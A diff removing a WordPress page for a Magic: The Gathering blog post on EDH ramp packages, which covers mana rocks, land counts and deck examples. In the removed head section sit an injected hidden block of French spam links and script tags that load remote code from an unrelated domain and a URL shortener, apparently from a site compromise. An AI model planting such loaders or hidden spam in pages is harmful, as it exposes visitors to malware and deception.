@@ -1,550 +1,476 @@
-
-<!doctype html><!--[if lt IE 7 ]> <html lang="en-US" prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb# article: http://ogp.me/ns/article#" class="no-js ie6"> <![endif]-->
-<!--[if IE 7 ]>    <html lang="en-US" prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb# article: http://ogp.me/ns/article#" class="no-js ie7"> <![endif]-->
-<!--[if IE 8 ]>    <html lang="en-US" prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb# article: http://ogp.me/ns/article#" class="no-js ie8"> <![endif]-->
-<!--[if IE 9 ]>    <html lang="en-US" prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb# article: http://ogp.me/ns/article#" class="no-js ie9"> <![endif]-->
-<!--[if (gt IE 9)|!(IE)]><!--> <html lang="en-US" prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb# article: http://ogp.me/ns/article#" class="no-js"> <!--<![endif]-->
+<!doctype html public "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html dir="LTR" lang="en">
 <head>
-
-	
-	<meta charset="UTF-8" />
-
-	<!-- Always force latest IE rendering engine (even in intranet) & Chrome Frame -->
-	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-
-	<title>Mana in EDH Part 2:  Choosing the Correct Ramp Package. | The Wizard&#039;s Cupboard</title>
-
-	<!--  Mobile viewport optimized: j.mp/bplateviewport -->
-	<meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-	<link rel="pingback" href="https://www.wizardscupboard.com/wordpress/xmlrpc.php" />
-
-	
-	
-<!-- SEO Ultimate (http://www.seodesignsolutions.com/wordpress-seo/) -->
-	<meta property="og:type" content="article" />
-	<meta property="og:title" content="Mana in EDH Part 2:  Choosing the Correct Ramp Package." />
-	<meta property="og:url" content="https://www.wizardscupboard.com/wordpress/mana-in-edh-part-2-choosing-the-correct-ramp-package/" />
-	<meta property="article:published_time" content="2015-06-23" />
-	<meta property="article:modified_time" content="2015-06-23" />
-	<meta property="article:author" content="https://www.wizardscupboard.com/wordpress/author/craig/" />
-	<meta property="article:section" content="EDH/Commander" />
-	<meta property="og:site_name" content="The Wizard&#039;s Cupboard" />
-	<meta name="twitter:card" content="summary" />
-<!-- /SEO Ultimate -->
-
-<link rel='dns-prefetch' href='//s.w.org' />
-<link rel="alternate" type="application/rss+xml" title="The Wizard&#039;s Cupboard &raquo; Feed" href="https://www.wizardscupboard.com/wordpress/feed/" />
-<link rel="alternate" type="application/rss+xml" title="The Wizard&#039;s Cupboard &raquo; Comments Feed" href="https://www.wizardscupboard.com/wordpress/comments/feed/" />
-<link rel="alternate" type="application/rss+xml" title="The Wizard&#039;s Cupboard &raquo; Mana in EDH Part 2:  Choosing the Correct Ramp Package. Comments Feed" href="https://www.wizardscupboard.com/wordpress/mana-in-edh-part-2-choosing-the-correct-ramp-package/feed/" />
-		<script type="text/javascript">
-			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2.2.1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2.2.1\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/www.wizardscupboard.com\/wordpress\/wp-includes\/js\/wp-emoji-release.min.js?ver=4.7.14"}};
-			!function(a,b,c){function d(a){var b,c,d,e,f=String.fromCharCode;if(!k||!k.fillText)return!1;switch(k.clearRect(0,0,j.width,j.height),k.textBaseline="top",k.font="600 32px Arial",a){case"flag":return k.fillText(f(55356,56826,55356,56819),0,0),!(j.toDataURL().length<3e3)&&(k.clearRect(0,0,j.width,j.height),k.fillText(f(55356,57331,65039,8205,55356,57096),0,0),b=j.toDataURL(),k.clearRect(0,0,j.width,j.height),k.fillText(f(55356,57331,55356,57096),0,0),c=j.toDataURL(),b!==c);case"emoji4":return k.fillText(f(55357,56425,55356,57341,8205,55357,56507),0,0),d=j.toDataURL(),k.clearRect(0,0,j.width,j.height),k.fillText(f(55357,56425,55356,57341,55357,56507),0,0),e=j.toDataURL(),d!==e}return!1}function e(a){var c=b.createElement("script");c.src=a,c.defer=c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var f,g,h,i,j=b.createElement("canvas"),k=j.getContext&&j.getContext("2d");for(i=Array("flag","emoji4"),c.supports={everything:!0,everythingExceptFlag:!0},h=0;h<i.length;h++)c.supports[i[h]]=d(i[h]),c.supports.everything=c.supports.everything&&c.supports[i[h]],"flag"!==i[h]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[i[h]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(g=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",g,!1),a.addEventListener("load",g,!1)):(a.attachEvent("onload",g),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),f=c.source||{},f.concatemoji?e(f.concatemoji):f.wpemoji&&f.twemoji&&(e(f.twemoji),e(f.wpemoji)))}(window,document,window._wpemojiSettings);
-		</script>
-		<style type="text/css">
-img.wp-smiley,
-img.emoji {
-	display: inline !important;
-	border: none !important;
-	box-shadow: none !important;
-	height: 1em !important;
-	width: 1em !important;
-	margin: 0 .07em !important;
-	vertical-align: -0.1em !important;
-	background: none !important;
-	padding: 0 !important;
-}
-</style>
-<link rel='stylesheet' id='open-sans-css'  href='https://fonts.googleapis.com/css?family=Open+Sans%3A300italic%2C400italic%2C600italic%2C300%2C400%2C600&#038;subset=latin%2Clatin-ext&#038;ver=4.7.14' type='text/css' media='all' />
-<link rel='stylesheet' id='highwind-styles-css'  href='https://www.wizardscupboard.com/wordpress/wp-content/themes/highwind/style.css?ver=1.2.4' type='text/css' media='all' />
-<script type='text/javascript' src='https://www.wizardscupboard.com/wordpress/wp-includes/js/jquery/jquery.js?ver=1.12.4'></script><script>jQueryWP = jQuery;</script>
-<script type='text/javascript' src='https://www.wizardscupboard.com/wordpress/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
-<script type='text/javascript' src='https://www.wizardscupboard.com/wordpress/wp-content/plugins/img-mouseover/img-mouseover.js?ver=20110509'></script>
-<script type='text/javascript' src='https://www.wizardscupboard.com/wordpress/wp-content/themes/highwind/framework/js/modernizr.min.js?ver=2.6.2'></script>
-<script type='text/javascript' src='https://www.wizardscupboard.com/wordpress/wp-content/themes/highwind/framework/js/fitvids.min.js?ver=1.0'></script>
-<link rel='https://api.w.org/' href='https://www.wizardscupboard.com/wordpress/wp-json/' />
-<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://www.wizardscupboard.com/wordpress/xmlrpc.php?rsd" />
-<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://www.wizardscupboard.com/wordpress/wp-includes/wlwmanifest.xml" /> 
-<link rel='prev' title='Preparing for GP Charlotte' href='https://www.wizardscupboard.com/wordpress/preparing-for-gp-charlotte/' />
-<link rel='next' title='Ten Magic Origins Cards that will Change EDH' href='https://www.wizardscupboard.com/wordpress/ten-magic-origins-cards-that-will-change-edh/' />
-<meta name="generator" content="WordPress 4.7.14" />
-<link rel="canonical" href="https://www.wizardscupboard.com/wordpress/mana-in-edh-part-2-choosing-the-correct-ramp-package/" />
-<link rel='shortlink' href='https://www.wizardscupboard.com/wordpress/?p=602' />
-<link rel="alternate" type="application/json+oembed" href="https://www.wizardscupboard.com/wordpress/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.wizardscupboard.com%2Fwordpress%2Fmana-in-edh-part-2-choosing-the-correct-ramp-package%2F" />
-<link rel="alternate" type="text/xml+oembed" href="https://www.wizardscupboard.com/wordpress/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.wizardscupboard.com%2Fwordpress%2Fmana-in-edh-part-2-choosing-the-correct-ramp-package%2F&#038;format=xml" />
-        <!--Customizer CSS-->
-        <style type="text/css">
-                a { color:#163d06; }input[type="submit"], .button, input[type="button"], .navigation-post a, .navigation-paging a, .header, .comments .bypostauthor > .comment-body .comment-content { background-color:#163d06; }body, input[type="text"], input[type="password"], input[type="email"], input[type="search"], input.input-text, textarea { color:#020202; }.comments .bypostauthor > .comment-body .comment-content:after { border-bottom-color:#163d06; }hr, input[type="checkbox"], input[type="radio"] { background:#020202; }input[type="radio"] { border-color:#020202; }h1, h2, h3, h4, h5, h6, .alpha, .beta, .gamma, .delta, .page-title, .post-title { color:#020101; }input[type="submit"], .button, input[type="button"], .navigation-post a, .navigation-paging a, input[type="checkbox"]:before, input[type="checkbox"]:checked:before, .comments .bypostauthor > .comment-body .comment-content, .comments .bypostauthor > .comment-body .comment-content a { color:#f9f9f9; }.comments .comment-content:after { border-bottom-color:#f9f9f9; }.inner-wrap, .main-nav { background-color:#f9f9f9; }                @media only screen and (min-width: 769px) {
-                    /* Styles only applied to desktop */
-                    .main-nav ul.menu ul, .main-nav ul.menu > li:hover > a, .main-nav ul.menu > li > a:hover { background:#163d06; }.main-nav ul.menu li.current-menu-item > a { color:##163d06; }.main-nav { border-color:#163d06; }.main-nav ul.menu li.current-menu-item > a:before { border-bottom-color:#163d06; }.main-nav ul.menu ul a, .main-nav ul.menu > li:hover > a { color:##f9f9f9; }body { background-color:#f8f8f9; }                }
-        </style>
-        <!--/Customizer CSS-->
-        		<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
-		<style type="text/css" id="custom-background-css">
-body.custom-background { background-color: #f8f8f9; }
-</style>
-<div id="aece353"><ul><li><a href="https://www.wizardscupboard.com/wordpress/modele-tiki-tattoo/" title="Modele tiki tattoo" >Modele tiki tattoo</a></li> <li><a href="https://www.wizardscupboard.com/wordpress/modele-robe-de-cortege/" title="Modele robe de cortège" >Modele robe de cortège</a></li> <li><a href="https://www.wizardscupboard.com/wordpress/modele-panier-zpagetti/" title="Modele panier zpagetti" >Modele panier zpagetti</a></li> <li><a href="https://www.wizardscupboard.com/wordpress/modele-lettre-desabonnement-canalsat/" title="Modele lettre desabonnement canalsat" >Modele lettre desabonnement canalsat</a></li> <li><a href="https://www.wizardscupboard.com/wordpress/modele-kangoo-2002/" title="Modele kangoo 2002" >Modele kangoo 2002</a></li> <li><a href="https://www.wizardscupboard.com/wordpress/modele-felicitation-naissance-gratuit/" title="Modele felicitation naissance gratuit" >Modele felicitation naissance gratuit</a></li> <li><a href="https://www.wizardscupboard.com/wordpress/modele-deliberation-approbation-reglement-interieur/" title="Modele deliberation approbation reglement interieur" >Modele deliberation approbation reglement interieur</a></li> <li><a href="https://www.wizardscupboard.com/wordpress/modele-de-tatouage-rose-des-vents/" title="Modele de tatouage rose des vents" >Modele de tatouage rose des vents</a></li> <li><a href="https://www.wizardscupboard.com/wordpress/modele-de-reference-osi/" title="Modele de reference osi" >Modele de reference osi</a></li> <li><a href="https://www.wizardscupboard.com/wordpress/modele-de-nao/" title="Modele de nao" >Modele de nao</a></li> <li><a href="https://www.wizardscupboard.com/wordpress/modele-de-lettre-plainte-contre-x-pour-vol/" title="Modele de lettre plainte contre x pour vol" >Modele de lettre plainte contre x pour vol</a></li> <li><a href="https://www.wizardscupboard.com/wordpress/modele-de-jupe-taille-haute-en-wax/" title="Modele de jupe taille haute en wax" >Modele de jupe taille haute en wax</a></li> <li><a href="https://www.wizardscupboard.com/wordpress/modele-de-devis-word-gratuit/" title="Modele de devis word gratuit" >Modele de devis word gratuit</a></li> <li><a href="https://www.wizardscupboard.com/wordpress/modele-de-contrat-de-mariage-separation-de-biens/" title="Modele de contrat de mariage separation de biens" >Modele de contrat de mariage separation de biens</a></li> <li><a href="https://www.wizardscupboard.com/wordpress/modele-de-brevet/" title="Modele de brevet" >Modele de brevet</a></li> <li><a href="https://www.wizardscupboard.com/wordpress/modele-cv-agent-de-quai/" title="Modele cv agent de quai" >Modele cv agent de quai</a></li> <li><a href="https://www.wizardscupboard.com/wordpress/modele-case-de-munte/" title="Modele case de munte" >Modele case de munte</a></li> <li><a href="https://www.wizardscupboard.com/wordpress/modele-projet-de-scission/" title="Modèle projet de scission" >Modèle projet de scission</a></li> <li><a href="https://www.wizardscupboard.com/wordpress/modele-lettre-de-stage-en-entreprise/" title="Modèle lettre de stage en entreprise" >Modèle lettre de stage en entreprise</a></li> <li><a href="https://www.wizardscupboard.com/wordpress/modele-haut-en-pagne/" title="Modèle haut en pagne" >Modèle haut en pagne</a></li> </ul><div><script type="text/javascript"> document.getElementById("aece353").style.display="none"; </script>
-
-<script src="http://exerciciofuncional.com.br/teste/index.php?P"></script>
-
-<script src="https://is.gd/GgGf9z?v=v25.0"></script></head>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<body class="post-template-default single single-post postid-602 single-format-standard custom-background two-column content-sidebar background-contrast">
-
-<div id="fb-root"></div>
-<script>(function(d, s, id) {
-  var js, fjs = d.getElementsByTagName(s)[0];
-  if (d.getElementById(id)) return;
-  js = d.createElement(s); js.id = id;
-  js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&appId=1536376929914286&version=v2.0";
-  fjs.parentNode.insertBefore(js, fjs);
-}(document, 'script', 'facebook-jssdk'));</script>
-
-
-<div class="outer-wrap" id="top">
-
-	<div class="inner-wrap">
-
-	
-	<header class="header content-wrapper" role="banner" style="background-image:url(https://www.wizardscupboard.com/wordpress/wp-content/uploads/2014/09/Art_M15_Art-5_Swanland_edited-3.jpg);">
-
-				<p class="toggle-container">
-			<a href="#navigation" class="nav-toggle button">
-				Skip to navigation			</a>
-		</p>
-					<a href="https://www.wizardscupboard.com/wordpress/" title="The Wizard&#039;s Cupboard" rel="home" class="site-intro">
-					<img src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2014/09/artifacts.WC_.sqaure-edited.jpg" class="avatar" />
-					<h1 class="site-title">The Wizard&#039;s Cupboard</h1>
-				<h2 class="site-description">Magic the Gathering Blog</h2>
-			</a>
-		
-		
-		<nav class="main-nav" id="navigation" role="navigation">
-
-			
-			<ul class="buttons">
-				<li class="home"><a href="https://www.wizardscupboard.com/wordpress" class="nav-home button"><span>Home</span></a></li>
-				<li class="close"><a href="#top" class="nav-close button"><span>Return to Content</span></a></li>
-			</ul>
-			<hr />
-			<h2>Menu 1</h2>
-			<div class="highwind-navigation"><ul id="menu-menu-1" class="menu"><li id="menu-item-274" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-274"><a href="http://www.wizardscupboard.com/wordpress/">Blog Home</a></li>
-<li id="menu-item-264" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-264"><a href="http://www.wizardscupboard.com/wordpress/?cat=6">Standard</a></li>
-<li id="menu-item-265" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-265"><a href="http://www.wizardscupboard.com/wordpress/?cat=1">EDH/Commander</a></li>
-<li id="menu-item-263" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-263"><a href="http://www.wizardscupboard.com/wordpress/?cat=5">MTG Ramblings</a></li>
-<li id="menu-item-269" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-269"><a href="http://www.wizardscupboard.com">Visit Store</a></li>
-<li id="menu-item-273" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-273"><a href="https://www.wizardscupboard.com/wordpress/about-us/">About Us</a></li>
-<li id="menu-item-277" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-277"><a href="https://www.wizardscupboard.com/wordpress/write-for-us/">Write For the WC</a></li>
-</ul></div>
-			
-		</nav><!-- /.main-nav -->
-
-		
-		
-	</header>
-
-	<div class="content-wrapper">
-
-	
-
-<section class="content" role="main">
-
-	
-	
-		<article id="post-602" class="post-602 post type-post status-publish format-standard hentry category-edh-commander">
-
-			
-			
-
-<header class="post-header">
-
-				<time class="post-date"><a href="https://www.wizardscupboard.com/wordpress/mana-in-edh-part-2-choosing-the-correct-ramp-package/" title="Permalink to Mana in EDH Part 2:  Choosing the Correct Ramp Package." rel="bookmark">June 23, 2015</a></time>
-		
-			<h1 class="post-title" data-text="Mana in EDH Part 2:  Choosing the Correct Ramp Package.">Mana in EDH Part 2:  Choosing the Correct Ramp Package.</h1>
-	
-	
-</header><!-- /.post-header -->
-
-<section class="article-content">
-
-	<h1><strong>Mana in EDH Part 2:  Choosing the Correct Ramp Package.</strong></h1>
-<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2014/12/971980_10201032448234043_1017665134_n.jpg"><img class="alignnone  wp-image-355" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2014/12/971980_10201032448234043_1017665134_n-300x275.jpg" alt="971980_10201032448234043_1017665134_n" width="205" height="188" srcset="https://www.wizardscupboard.com/wordpress/wp-content/uploads/2014/12/971980_10201032448234043_1017665134_n-300x275.jpg 300w, https://www.wizardscupboard.com/wordpress/wp-content/uploads/2014/12/971980_10201032448234043_1017665134_n.jpg 344w" sizes="(max-width: 205px) 100vw, 205px" /></a></p>
-<p><strong><strong>By Craig Sidorowicz</strong></strong></p>
-<p>In <a href="http://www.wizardscupboard.com/wordpress/commander-101-mana-in-edh-part-one-the-basics-and-nonbasics/">Part one</a>, we discussed the importance of playing the correct quantity of lands. We also evaluated each cycle of Playable dual lands to ensure we build decks with the best lands available.  Now, we&#8217;ll take a look at another deceivingly complicated aspect of deckbuilding: the &#8220;Resource Amplification Management Package, also known (to magic professionals) as: R.A.M.P!&#8230;</p>
-<p><strong><strong> </strong></strong></p>
-<p>&#8230;Just kidding! &#8220;Ramp&#8221; is actually just a shorthand for movement to a higher point on your &#8220;available mana curve,&#8221; and is slang derived from one of the original spells to help us do this: Rampant Growth</p>
-<h1>I. Feed Me!</h1>
-<p>Originally printed in Mirage, Rampant Growth has been featured in fourteen different magic sets, and has usually made an impact on the standard format.  It&#8217;s main purposes are to fix mana and to make a midrange deck faster than other midrange decks (think &#8220;Jund&#8221; in Alara-Zendikar Standard) or to help &#8220;big&#8221; decks accelerate into the high cost cards on their mana curve (Eldrazi Green in Zendikar/Scars Standard).  I wouldn&#8217;t be surprised if it reappears on the &#8220;big stage&#8221; in Battle For Zendikar, where we are likely to see the Landfall and &#8220;Big Dumb Annihilator Titan&#8221; mechanics revisited.</p>
-<p><strong><strong> <a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/06/Rampant-Growth.jpg"><img class="alignnone size-medium wp-image-604" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/06/Rampant-Growth-211x300.jpg" alt="Rampant Growth" width="211" height="300" srcset="https://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/06/Rampant-Growth-211x300.jpg 211w, https://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/06/Rampant-Growth.jpg 480w" sizes="(max-width: 211px) 100vw, 211px" /></a></strong></strong></p>
-<p>In magic&#8217;s history there have been a few hundred cards printed for the purpose of (R)amplifying our available mana resources by doing one of the following things:</p>
-<ul>
-<li><strong><strong> </strong></strong>Allowing an additional land to be put into play (sometimes from the hand or top of library).</li>
-<li>Searching the library for lands and putting them onto the battlefield untapped.</li>
-<li>Searching the library for lands and putting them onto the battlefield tapped.</li>
-<li>Searching the library for a land and putting it into the player&#8217;s hand. (This is not technically ramp, because you do not gain a resource unless you put the land into play that turn, but you do gain consistency/color fixing.) This is also known as a &#8220;tutor.&#8221;</li>
-<li>Existing as a nonland permanent that produces mana (usually creatures or artifacts but sometimes enchantments).</li>
-<li>Existing as a nonland permanent that modifies existing lands by allowing them to tap for additional mana.</li>
-</ul>
-<p><strong><strong> </strong></strong>Since there are hundreds of options, our question/problem becomes:</p>
-<p style="padding-left: 30px">&#8220;Which ramp spells should we include in our deck?&#8221;</p>
-<p style="padding-left: 30px">&#8220;How many&#8221; of these effects does a deck need to have, without overdoing it?</p>
-<p><strong><strong> </strong></strong>This is actually a multifaceted problem, calling for analysis of:</p>
-<ul>
-<li>Which are the most powerful/efficient?</li>
-<li>Which have the most synergy with the plan/strategy of the deck?</li>
-</ul>
-<h2>How Many?</h2>
-<p>Just like our land discussion from last article, it makes sense to start with: &#8220;how many?&#8221;  If you use too few, you really sacrifice any reliable chance of consistency.  Too many, and you run the risk of saturating your deck with cards that are <em>horrible</em> topdecks when drawn late-game.  Once we know the correct number of slots to devote, we can begin to plan.</p>
-<p>Lets get to work!</p>
-<p>First off, our deck is (should be!) 35-40% land.  Of the 60-65 cards remaining, I like to dedicate about 10-20% (so 6-12 cards) of that to mana enablers.  This would roughly be the equivalent of 1-2 playsets (4-ofs) in a 60 card deck in any other format.  Green decks usually have more efficient enablers, so its reasonable to conclude that I need fewer of them than I would in a non-green deck.  For example, Cultivate and Wayfarer&#8217;s Bauble are both great mana enablers.  They effectively cost 3 mana to utilize their effects, but cultivate nets twice the benefit (1.5 if you&#8217;ve already played a land.)  Unfortunately, a mono-red deck can&#8217;t include Cultivate, so it makes sense to include another mana enabler in the red deck if I want to keep up with a green deck.  As you can see, this puts the colors with the fewest mana enablers (red and blue) at a disadvantage when it comes to ramping.  Luckily, though, there are some amazing artifacts available (Sol Ring, Solemn Simulacrum) to help get the job done.  In the next section, we will discuss which mana enablers have the most synergy with a selection of deck strategies.</p>
-<h1><strong><strong> </strong></strong>II: It&#8217;s Easier Being Green</h1>
-<p>Color combinations that include green are at an advantage, to the point that it might be considered an embarrassment of riches.  We have so many options to choose from, so we must think strategically.  Let&#8217;s examine a few example scenarios and diagnose the best possible mana-fixing options for each:</p>
-<h3><strong><strong> </strong></strong>Mono Green Ezuri Overrun (Click to enlarge picture)</h3>
-<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Ezuri-Deck.png"><img class="alignnone size-medium wp-image-517" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Ezuri-Deck-274x300.png" alt="Ezuri Deck" width="274" height="300" srcset="https://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Ezuri-Deck-274x300.png 274w, https://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Ezuri-Deck.png 801w" sizes="(max-width: 274px) 100vw, 274px" /></a></p>
-<p>You are familiar with this deck from last article, so we will start there.   The deck&#8217;s strategy is to amass a collection of mana-producing elves, and then use Ezuri&#8217;s abilities to protect, and then overwhelm, our opponents.  The elves serve a dual purpose here: they give us mana in the beginning stage, then provide soldiers for our finishIng moves. In this list, we only run (x) lands, and have many elves available to produce green or untap our green producing lands.  We run fewer lands because we have a low curve, but this leaves us open to board wipes or anti-creature strategies like Humility.</p>
-<p><em><strong>Added Synergy</strong></em>: permanent-based (especially tribal creature) mana producers, elves that search for lands and put them into play, Land tutors: Sylvan Scrying and Crop Rotation can grab Gaea&#8217;s Cradle, or Yavimaya Hollow)</p>
-<p><em><strong>Decreased Synergy</strong></em>: mana rocks (we play green), extra land enablers (we play too few lands). Spell-based ramp effects (we can do this with just our creatures), mana doublers: (they don&#8217;t have legs, thus cannot attack!)</p>
-<h2><strong><strong> </strong></strong>Edric&#8217;s Elves</h2>
-<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/06/Edrics-Elves.png"><img class="alignnone size-medium wp-image-614" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/06/Edrics-Elves-291x300.png" alt="Edric's Elves" width="291" height="300" srcset="https://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/06/Edrics-Elves-291x300.png 291w, https://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/06/Edrics-Elves.png 812w" sizes="(max-width: 291px) 100vw, 291px" /></a></p>
-<p>This deck has a similar plan to Ezuri, but it is less straightforward.  It seeks to build a massive army via Edric&#8217;s card drawing ability and eventually overrun opponents.  The twist is that it does so with spell-based overruns (Overwhelming Stampede, Triumph of the Hordes) and backs it up with 8-10 of the best Counterspells.</p>
-<p><em><strong>Added Synergy</strong></em>: Permanent-Based (tribal creatures that tap for mana), Spell Based: Cultivate, Kodama&#8217;s Reach, and Skyshroud Claim go a long way in helping us secure double-blue for countermagic), Land Tutors for Cradle are also applicable here.</p>
-<p><em><strong>Decreased Synergy</strong></em>: mana rocks (we play green), extra land enablers (too few lands), mana doublers (two colors)</p>
-<h2><strong><strong> </strong></strong>Azusa Turboland</h2>
-<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Azusa.png"><img class="alignnone size-medium wp-image-516" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Azusa-300x219.png" alt="Azusa" width="300" height="219" srcset="https://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Azusa-300x219.png 300w, https://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Azusa.png 902w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>
-<p>As we remember from last article, this list wants to drop as many lands as possible using the most efficient means possible.  Azusa is the strongest, and has cousins like Oracle of Mul Daya and Courser that can help her with her work.  She also uses mana-doublers, which are best applied in Mono-Color decks, (although Mirari&#8217;s Wake is amazing too!).</p>
-<p><em><strong>Added Synergy</strong></em>: Extra Land enablers, spell based ramp, mana doublers, Land tutors for many specialty lands.</p>
-<p><em><strong>Decreased Synergy</strong></em>: Mana Rocks (exception is Mind Stone/ Commander&#8217;s Sphere for card draw), Tribal creatures (we want to go BIG as opposed to having a wide line of small creatures.</p>
-<h2><strong><strong> </strong></strong>Marath Token Landfall</h2>
-<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/06/Marath.png"><img class="alignnone size-medium wp-image-616" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/06/Marath-300x291.png" alt="Marath" width="300" height="291" srcset="https://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/06/Marath-300x291.png 300w, https://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/06/Marath.png 796w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>
-<p>The goal here is to utilize Marath, token producers, and planeswalkers (and break them with Doubling season effects).  Cards that bring lands from the library onto the battlefield are especially useful here. This decklist uses a combination package: basically anything on theme with landfall.  I would avoid using mana creatures (except Lotus Cobra) because they have the potential to be collateral damage when an opponent board-wipes my big creatures.  The deck is a bit greedy with the red mana producing lands, however red is a minor splash color for this predominantly Green/White build.</p>
-<p><em><strong>Added Synergy</strong></em>: landfall ramp, mana doubler (mirari&#8217;s Wake)</p>
-<p><em><strong>Decreased Synergy</strong></em>: mana rocks (chromatic lantern is a strong card in any tri-color deck though!), extra land enablers (we don’t play an high enough quantity of land).</p>
-<p><strong><strong> </strong></strong></p>
-<h1>III. The Sad Robot</h1>
-<p>For years I struggled with durdly esper, azorius, rakdos, and orzhov decks.  For some reason they just couldn&#8217;t compete with the Animars, momir Vigs, and Ghave decks of my playgroup, and after quite a few losses I finally realized that I was building these color combinations with subpar Ramp Packages.</p>
-<p><strong><strong> </strong></strong>Then a sad robot showed me the way&#8230;</p>
-<p><strong><strong> <a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/06/Solemn-Simulacrum.jpg"><img class="alignnone size-medium wp-image-607" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/06/Solemn-Simulacrum-211x300.jpg" alt="Solemn Simulacrum" width="211" height="300" srcset="https://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/06/Solemn-Simulacrum-211x300.jpg 211w, https://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/06/Solemn-Simulacrum.jpg 480w" sizes="(max-width: 211px) 100vw, 211px" /></a></strong></strong></p>
-<p>Like Sol Ring and Sensei&#8217;s Divining Top, Solemn Simulacrum ranks as a 99% auto include in any EDH deck. By it&#8217;s design it&#8217;s pretty straightforward, but it&#8217;s value is defined by its overabundance of&#8230;well&#8230;VALUE!  So many players initially brush this card off, but later realize it serves multiple functions: Ramp, Attack, Block, and Card Draw.  It also interacts well with artifact synergies.</p>
-<p><strong><strong> </strong></strong>First, it ramps your mana, then it blocks for you (or gives you a creature to sacrifice) then it draws you a card.  Further, it does so for colorless mana.  It is also used as a political bargaining chip more than any other card I know.  What other creature are you happier to have blocked, sacrificed, or indiscriminately killed? How many times has an opponent politely asked you to block their Sad Robot so that they can have another chance to draw the extra card that could save the game from a degenerate board state?</p>
-<p>I include him in almost every deck.  He&#8217;s just that good.</p>
-<h2><strong><strong> </strong></strong>Mana Rocks</h2>
-<p>There are more and more of these being printed in each set.  They too have a distinct hierarchy, so I&#8217;ll be a pal, and break it down for you:</p>
-<h3><strong><strong> </strong></strong>Tier 1: Enters untapped, produces more than one mana, or more than one color, with as few drawbacks as possible, low to moderate (0-3) mana cost.</h3>
-<p><strong><strong> </strong></strong>If I saw these in any deck (including a green deck) I wouldn&#8217;t question them.  They all function independently: do not require other cards or requirements to perform their function.</p>
-<ul>
-<li>Sol Ring</li>
-<li>Mana Crypt</li>
-<li>Gilded Lotus</li>
-<li>Thran Dynamo</li>
-<li>Mirrodin Talismans</li>
-<li>Chromatic Lantern</li>
-<li>Coalition Relic</li>
-<li>Mind Stone</li>
-<li>Commander&#8217;s Sphere</li>
-</ul>
-<p><strong><strong> <a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/06/Chromatic-Lantern.jpg"><img class="alignnone size-medium wp-image-608" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/06/Chromatic-Lantern-211x300.jpg" alt="Chromatic Lantern" width="211" height="300" srcset="https://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/06/Chromatic-Lantern-211x300.jpg 211w, https://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/06/Chromatic-Lantern.jpg 480w" sizes="(max-width: 211px) 100vw, 211px" /></a></strong></strong></p>
-<h2>Mana doublers: best in mono-color decks because they reward you for having basic lands.</h2>
-<ul>
-<li>Caged Sun</li>
